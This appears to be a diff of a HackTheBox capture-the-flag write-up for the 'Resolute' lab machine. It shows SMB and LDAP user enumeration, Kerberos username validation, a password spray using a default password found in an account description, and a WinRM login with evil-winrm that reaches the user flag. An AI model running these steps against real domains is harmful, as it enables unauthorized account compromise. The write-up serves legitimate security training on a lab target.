@@ -109,19 +109,191 @@ Was able to perform anonymous login but no shares returned:
 smbclient -L //10.10.10.169 -N
 ```
 
-Other commands used:
+Found User Accounts with crackmapexec:
 
 ```bash
-crackmapexec smb 10.10.10.169
+crackmapexec smb 10.10.10.169 -u '' -p '' --users
 
-crackmapexec smb 10.10.10.169 --shares
-
-smbmap -H 10.10.10.169 -L
-
-crackmapexec smb 10.10.10.169 -u 'guest' -p '' --rid-brute
-
-crackmapexec smb 10.10.10.169 -u '' -p '' --rid-brute
+SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated domain user(s)
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\Administrator                  Built-in account for administering the computer/domain                                                                                                                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\Guest                          Built-in account for guest access to the computer/domain                                                                                                                      
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\krbtgt                         Key Distribution Center Service Account                                                                                                                                       
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\DefaultAccount                 A user account managed by the system.
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\ryan                           
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\marko                          Account created. Password set to Welcome123!                                                                                                                                  
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\sunita                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\abigail                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\marcus                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\sally                          
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\fred                           
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\angela                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\felicia                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\gustavo                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\ulf                            
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\stevie                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\claire                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\paulo                          
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\steve                          
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\annette                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\annika                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\per                            
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\claude                         
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\melanie                        
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\zach                           
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\simon                          
+SMB         10.10.10.169    445    RESOLUTE         megabank.local\naoki
 ```
+
+## LDAP Enumeration
+
+Extract base naming contexts:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.169 -s base namingcontexts
+
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingContexts: DC=megabank,DC=local
+namingContexts: CN=Configuration,DC=megabank,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
+namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
+namingContexts: DC=ForestDnsZones,DC=megabank,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+Extract list of users and found user Marko with password set to `Welcome123!`:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=person)' > ldap-people
+
+cn: Marko Novak
+sn: Novak
+description: Account created. Password set to Welcome123!
+givenName: Marko
+distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,D
+ C=local
+```
+
+## Kerberos
+
+Validated list of names pulled from LDAP:
+
+```bash
+sudo ./kerbrute_linux_amd64 userenum --dc 10.10.10.169 -d megabank.local -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Resolute/userlist
+
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       MS02$@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       ryan@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       marcus@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       sunita@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       marko@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       RESOLUTE$@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       sally@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       abigail@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       felicia@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       angela@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       fred@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       gustavo@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       stevie@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       ulf@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       claire@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       paulo@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       steve@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       annette@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       annika@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       per@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       claude@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       melanie@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       zach@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       simon@megabank.local
+2024/06/22 13:09:19 >  [+] VALID USERNAME:       naoki@megabank.local
+```
+
+ASREPRoasting failed to find a user account that has the privilege "Does not require Pre-Authentication" set:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megabank.local/ -dc-ip 10.10.10.169 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
+```
+
+## SMB Enumeration - Reused Password (Part 2)
+
+Attempted to use credentials `marko:Welcome123!` to further enumerate SMB shares or attempt to run Keberos attack but these failed. Checked if the password could be resused for another user or if there is a user that can have there password reset.
+
+```bash
+crackmapexec smb 10.10.10.169 -u userlist -p Welcome123!          
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\RESOLUTE$:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\MS02$:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!                       # <---- Interesting!
+```
+
+Looks like `Marko` remebered to change his password but not `melanie`. Checked if `melanie` has WINRM access:
+
+```bash
+crackmapexec winrm 10.10.10.169 -u melanie -p 'Welcome123!'                                                          
+SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
+HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
+WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
+```
+
+Used `evil-winrm` to get the flag:
+
+```bash
+evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
+
+
+*Evil-WinRM* PS C:\Users\melanie\Desktop> dir
+
+
+    Directory: C:\Users\melanie\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/22/2024   4:41 AM             34 user.txt
+
+```
+
+# Root Flag
+
+## Windows Privilege Escalation
+
+Uploaded `winPEASx64.exe` but did not observe any details of interest.
+
 
 
 
